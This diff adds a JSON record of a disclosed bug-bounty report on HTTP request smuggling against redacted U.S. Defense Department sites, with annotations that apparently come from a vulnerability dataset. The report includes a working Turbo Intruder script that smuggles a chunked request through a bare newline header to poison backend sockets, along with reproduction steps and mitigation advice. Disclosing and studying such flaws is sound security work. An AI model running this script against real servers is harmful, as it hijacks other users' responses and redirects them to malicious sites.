@@ -1,0 +1,46 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "albinowax ",
+    "title": "Request smuggling on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+    "content": "\nSummary:\nDescription:\nThe sites at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and ww.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.\nThis vulnerability occurs because the backend server regards \\n as a valid header ending, whereas the backend only thinks \\r\\n is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.\nImpact\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.\nStep-by-step Reproduction Instructions\nTo replicate this with minimal risk of affecting legitimate users we'll target stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 instead of \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, and use the following turbo intruder script:\nI've hard-coded the endpoint to \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 because it appears that you've got multiple endpoints for stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and some are not vulnerable.\nCode 1.11 KiB\n1def queueRequests(target, wordlists):\n2    engine = RequestEngine(endpoint='https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:443',\n3                           concurrentConnections=5,\n4                           requestsPerConnection=1,\n5                           pipeline=False,\n6                           maxRetriesPerRequest=0\n7                           )\n8    engine.start()    \n9\n10    attack = '''POST /\u2588\u2588\u2588\u2588 HTTP/1.1\n11Fooz: bar\\nTransfer-Encoding: chunked\n12Host: stage.\u2588\u2588\u2588\u2588\u2588\n13Accept-Encoding: gzip, deflate\n14Accept: */*\n15Accept-Language: en\n16User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n17Connection: keep-alive\n18Content-Type: application/x-www-form-urlencoded\n19Content-Length: 77\n20Foo: bar\n21\n220\n23\n24GET\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n25X: X'''\n26\n27    engine.queue(attack)\n28\n29    victim = '''GET /foo.jpg?x=%s HTTP/1.1\n30Host: stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n31Accept-Encoding: gzip, deflate\n32Accept: */*\n33Accept-Language: en\n34User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n35Connection: keep-alive\n36\n37'''\n38    for i in range(15):\n39        engine.queue(victim, i)\n40        time.sleep(0.2)\n41\n42\n43def handleResponse(req, interesting):\n44    table.add(req)\n45\nYou should observe that one of the responses to a victim request is a 302 redirect to \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nWhen I resolve stage.\u2588\u2588\u2588 I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:\nCode 189 Bytes\n1stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2stage.\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3stage.\u2588\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\u2588\n4stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\n5stage.\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\t\t59\tIN\tA\t\u2588\u2588\u2588\u2588\u2588\nImpact\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "HTTP Request Smuggling"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1570574520,
+    "report_url": "https://hackerone.com/reports/526880",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify the vulnerable endpoint on stage.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 that interprets \\n as a header ending."
+        ],
+        [
+            2,
+            "Craft a malicious request with \\n in the headers to exploit the discrepancy between frontend and backend servers."
+        ],
+        [
+            3,
+            "Send the crafted request using a tool like Turbo Intruder to poison the backend socket."
+        ],
+        [
+            4,
+            "Observe the response to victim requests, which should include a 302 redirect to a malicious site."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a request smuggling attack where the frontend and backend servers interpret header endings differently (\\n vs \\r\\n). This discrepancy allows an attacker to poison backend sockets and hijack responses to other users, potentially redirecting them to malicious websites.",
+    "reason": "The attack requires understanding of HTTP protocol nuances (header endings), crafting a specific request to exploit the discrepancy, and using a tool to send the attack. The interaction between the frontend and backend servers is subtle and not immediately obvious.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
